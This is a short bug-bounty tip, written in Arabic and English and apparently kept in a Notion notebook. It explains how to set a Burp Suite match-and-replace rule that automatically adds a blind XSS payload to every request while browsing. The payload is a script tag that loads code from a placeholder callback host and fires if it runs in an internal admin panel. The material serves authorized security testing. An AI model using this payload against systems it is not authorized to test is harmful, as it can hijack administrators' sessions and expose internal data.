# Blind XSS أوتوماتيكي عبر Match & Replace في Burp

**Rating:** 🔥 قوية  
**Category:** XSS  
**Status:** Not started  

## How It Works

بدل ما تدور يدوي على أماكن الحقن المحتملة، اعمل match & replace rule في الـ proxy (Burp) يحقن الـ Blind XSS payload بتاعك أوتوماتيكيًا في كل ريكووست بتبعته وانت بتتصفح عادي. لو الـ payload اتنفذ في admin panel أو dashboard داخلي، هتوصلك إشعار على سيرفر الـ XSS Hunter/interactsh بتاعك.

## Payload / Code

```
في Burp: Proxy > Match and Replace
Match: rn (أي header)
Replace: rn<blind-xss-header>: "><script src=https://YOUR-XSS-HUNTER-URL></script>rn

أو أضف الـ payload في كل قيمة param بتمر عليها أثناء التصفح العادي
```

## Source

Intigriti Official — 31 Bug Bounty Tips 2026 (Tip 1)

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
